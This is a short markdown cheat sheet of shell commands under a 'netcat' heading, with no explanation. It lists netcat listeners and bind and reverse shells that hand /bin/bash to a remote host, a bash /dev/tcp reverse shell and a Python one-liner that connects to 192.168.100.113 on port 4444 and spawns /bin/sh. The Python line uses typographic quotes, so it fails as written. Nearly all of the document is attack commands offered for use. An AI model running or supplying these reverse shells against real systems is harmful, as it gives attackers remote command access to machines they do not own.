## netcat

```
nc -lnvp 87 -s 192.168.178.44

nc -l -p 87 -e /bin/bash

nc 192.168.178.44 87 -e /bin/bash


nc -lvp 87

bash -i >& /dev/tcp/192.168.178.44/87 0>&1 
```

python reverse shell
```
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```
